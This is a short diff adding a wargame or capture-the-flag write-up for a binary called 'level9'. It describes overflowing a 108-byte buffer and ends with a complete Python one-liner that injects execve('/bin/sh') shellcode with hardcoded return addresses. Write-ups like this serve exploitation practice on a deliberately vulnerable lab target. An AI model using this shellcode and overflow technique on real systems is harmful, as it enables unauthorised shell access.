@@ -1,1 +1,5 @@
+after some tests we found that we can use a buffer overflow to write on EAX and ECX after 108 bytes of input
+when reading the source code we saw no call to system so we will use a shellcode found on the web to open a shell
+our shellcode will be located at the address 0x804a010 and our buffer will be located at 0x804a00c
+with those informations we can build our shellcode like (shellcode address + shellcode + padding until 108 bytes are reached + buffer address)
 ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
